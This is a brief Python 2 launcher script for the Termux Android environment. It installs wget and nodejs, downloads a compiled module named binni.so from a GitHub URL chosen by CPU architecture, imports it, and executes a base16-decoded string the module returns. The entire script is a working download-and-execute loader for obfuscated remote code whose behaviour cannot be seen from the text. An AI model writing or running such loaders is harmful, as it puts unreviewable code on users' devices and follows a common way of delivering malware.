#!/data/data/com.termux/files/usr/bin/python2
#coding=utf-8
import os,platform,time,base64
if not os.path.isfile('/data/data/com.termux/files/usr/bin/wget'):
	os.system('pkg update && pkg install wget -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
	os.system('pkg update && pkg install nodejs -y')
bit=platform.architecture()[0]
if not os.path.isfile('binni.so'):
	os.system('wget https://raw.githubusercontent.com/Binyamin-binni/Binaries/main/bxi/for-termux/{}/binni.so'.format(bit))
	time.sleep(1)
	import binni
	exec(base64.b16decode(binni.bcoder909()))
elif os.path.isfile('binni.so'):
	import binni
	exec(base64.b16decode(binni.bcoder909()))
